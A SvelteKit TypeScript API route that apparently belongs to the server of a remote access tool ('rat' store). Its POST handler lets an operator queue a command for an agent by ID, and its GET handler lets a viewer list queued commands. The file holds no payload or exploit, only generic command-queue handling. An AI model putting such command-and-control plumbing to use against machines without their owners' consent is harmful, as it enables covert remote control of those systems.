import { json, error } from '@sveltejs/kit';
import type { RequestHandler } from './$types';
import { registry, RegistryError } from '$lib/server/rat/store';
import { requireOperator, requireViewer } from '$lib/server/authorization';
import type {
	CommandInput,
	CommandQueueSnapshot
} from '../../../../../../../shared/types/messages';

export const POST: RequestHandler = async ({ params, request, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	const user = requireOperator(locals.user);

	let payload: CommandInput;
	try {
		payload = (await request.json()) as CommandInput;
	} catch {
		throw error(400, 'Invalid command payload');
	}

	if (!payload?.name) {
		throw error(400, 'Command name is required');
	}

	try {
		const response = registry.queueCommand(id, payload, { operatorId: user.id });
		return json(response);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to queue command');
	}
};

export const GET: RequestHandler = ({ params, locals }) => {
	const id = params.id;
	if (!id) {
		throw error(400, 'Missing agent identifier');
	}

	requireViewer(locals.user);

	try {
		const commands = registry.peekCommands(id);
		return json({ commands } satisfies CommandQueueSnapshot);
	} catch (err) {
		if (err instanceof RegistryError) {
			throw error(err.status, err.message);
		}
		throw error(500, 'Failed to fetch queued commands');
	}
};
